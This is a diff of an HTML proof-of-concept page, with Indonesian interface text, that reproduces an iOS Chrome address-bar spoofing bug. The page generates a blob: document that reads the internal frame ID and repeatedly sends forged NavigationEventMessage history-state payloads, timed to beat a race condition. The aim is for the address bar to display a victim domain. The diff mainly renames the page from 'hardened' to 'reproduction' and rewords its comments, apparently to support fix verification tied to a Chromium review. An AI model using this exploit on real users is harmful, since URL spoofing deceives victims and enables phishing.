@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Advanced Hardened - iOS Chrome Blob History Spoof</title>
+    <title>PoC Reproduction - iOS Chrome Blob History Spoof</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -48,13 +48,13 @@
 </head>
 <body>
 
-    <h1>iOS Chrome History Spoof - Advanced Hardened PoC</h1>
-    <p>Halaman ini menguji secara agresif validasi <code>IsHistoryStateChangeValid</code> pada iOS Chrome menggunakan payload blob terenkapsulasi.</p>
+    <h1>iOS Chrome History Spoof - Reproduction PoC</h1>
+    <p>Halaman ini digunakan untuk prosedur ulang validasi <code>IsHistoryStateChangeValid</code> pada iOS Chrome berdasarkan [Chromium Review Change 8291494](https://chromium-review.googlesource.com/c/chromium/src/+/8291494).</p>
 
     <div class="card">
-        <h3>1. Hardened Blob Launcher</h3>
-        <p>Membuat objek blob mandiri dengan skrip eksploitasi multi-tahap tingkat lanjut.</p>
-        <button id="launch-btn">Jalankan Hardened PoC</button>
+        <h3>1. Blob Launcher</h3>
+        <p>Membuat objek blob terenkapsulasi untuk memicu manipulasi *history state* lintas asal.</p>
+        <button id="launch-btn">Mulai Prosedur Ulang</button>
         <pre id="launcher-log">Status: Menunggu eksekusi...</pre>
     </div>
 
@@ -69,13 +69,13 @@
     // Template HTML payload yang dimasukkan ke dalam Blob URL
     const BLOB_DOC = `<!doctype html>
 <meta charset=utf-8>
-<title>Example Domain - Spoof Target</title>
+<title>Example Domain - Reproduction Target</title>
 <style>
   body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff5f5; }
   h2 { color: #b31412; }
   pre { background: #111; color: #5af78e; padding: 12px; font-size: 11px; white-space: pre-wrap; }
 </style>
-<h2>Hardened Blob Context Active</h2>
+<h2>Blob Sandbox Active</h2>
 <p>Asal Dokumen (Origin): <code id="origin"></code></p>
 <p>URL Saat Ini: <code id="cur-url"></code></p>
 <pre id="blob-log"></pre>
@@ -83,21 +83,21 @@
 (function(){
   function bLog(msg) {
     document.getElementById('blob-log').textContent += msg + '\\n';
-    try { console.log('[HardenedPoC] ' + msg); } catch(e){}
+    try { console.log('[ReproPoC] ' + msg); } catch(e){}
   }
   
   document.getElementById('origin').textContent = location.origin || '(opaque)';
   document.getElementById('cur-url').textContent = location.href;
-  bLog('Hardened blob dokumen berhasil di-render.');
+  bLog('Blob dokumen berhasil dimuat.');
 
   var mh = (window.webkit && window.webkit.messageHandlers) || {};
   if (!mh.NavigationEventMessage) {
-    bLog('SKIP: window.webkit.messageHandlers.NavigationEventMessage tidak tersedia.');
+    bLog('SKIP: window.webkit.messageHandlers.NavigationEventMessage tidak tersedia (bukan iOS Chrome).');
     return;
   }
   bLog('SUCCESS: Handler NavigationEventMessage terdeteksi.');
 
-  // Pengambilan frame_id yang diperkuat (dengan berbagai opsi fallback)
+  // Pengambilan frame_id dengan berbagai opsi fallback
   var getFid = function() {
     try {
       if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
@@ -119,11 +119,10 @@
   var fid = getFid();
   bLog('Frame ID terdeteksi: ' + (fid || 'TIDAK DITEMUKAN'));
 
-  // Target spoofing alamat bar menggunakan example.com
   var spoofUrl = 'blob:https://' + "${VICTIM}" + '/';
   bLog('Target spoof URL: ' + spoofUrl);
 
-  // Fungsi pengiriman payload agresif berkali-kali untuk menghindari race condition
+  // Fungsi pengiriman payload postMessage berulang untuk menghindari race condition
   var firePayload = function(index) {
     var currentFid = getFid() || fid;
     if (!currentFid) {
@@ -145,30 +144,30 @@
     }
   };
 
-  // Eksekusi beruntun dengan interval ketat
+  // Eksekusi beruntun dengan interval waktu
   firePayload(1);
   setTimeout(function(){ firePayload(2); }, 100);
   setTimeout(function(){ firePayload(3); }, 300);
   setTimeout(function(){ firePayload(4); }, 600);
 
   setTimeout(function(){
-    bLog('\\n--- EVALUASI AKHIR ---');
-    bLog('Periksa bilah alamat (Address Bar) perangkat Anda.');
-    bLog('Jika menampilkan "' + "${VICTIM}" + '": Proteksi gagal / Rentan.');
-    bLog('Jika tetap menampilkan awalan blob: URL: Proteksi berhasil / Aman.');
+    bLog('\\n--- EVALUASI PROSEDUR ---');
+    bLog('Periksa Address Bar Anda.');
+    bLog('Jika menampilkan "' + "${VICTIM}" + '": Perilaku rentan terekam.');
+    bLog('Jika tetap menampilkan URL blob: Perbaikan aktif dan menolak state change.');
   }, 1000);
 })();
 <\/script>`;
 
-    function startHardenedPoC() {
+    function startReproductionPoC() {
         try {
             const diag = document.getElementById('diag-log');
-            diag.textContent += "[*] Mempersiapkan payload blob...\n";
+            diag.textContent += "[*] Mempersiapkan objek blob...\n";
             
             const blob = new Blob([BLOB_DOC], { type: 'text/html' });
             const blobUrl = URL.createObjectURL(blob);
             
-            document.getElementById('launcher-log').innerHTML = `<span class="info">Mengarahkan ke Blob URL: ${blobUrl}</span>`;
+            document.getElementById('launcher-log').innerHTML = `<span class="info">Mengarahkan ke: ${blobUrl}</span>`;
             diag.textContent += `[*] Navigasi otomatis menuju: ${blobUrl}\n`;
             
             setTimeout(() => {
@@ -179,7 +178,7 @@
         }
     }
 
-    document.getElementById('launch-btn').addEventListener('click', startHardenedPoC);
+    document.getElementById('launch-btn').addEventListener('click', startReproductionPoC);
 </script>
 
 </body>
